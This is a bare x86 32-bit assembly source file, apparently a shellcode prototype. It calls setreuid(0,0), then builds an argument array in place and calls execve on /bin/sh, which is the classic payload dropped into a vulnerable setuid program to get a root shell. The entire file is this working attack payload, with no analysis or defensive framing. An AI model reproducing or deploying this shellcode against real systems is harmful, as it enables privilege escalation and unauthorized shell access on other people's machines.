.data
filepath:
        .string "/bin/shXAAAABBBB"
.text
.global _start
_start:

        movl $70, %eax
        movl $0, %ebx
        movl $0, %ecx
        int $0x80
        
        movl $0, %eax
        movl $filepath, %ebx
        movb %al, 7(%ebx)
        movl %ebx, 8(%ebx)
        movl %eax, 12(%ebx)

        movl $11, %eax
        leal 8(%ebx), %ecx
        leal 12(%ebx), %edx
        int $0x80
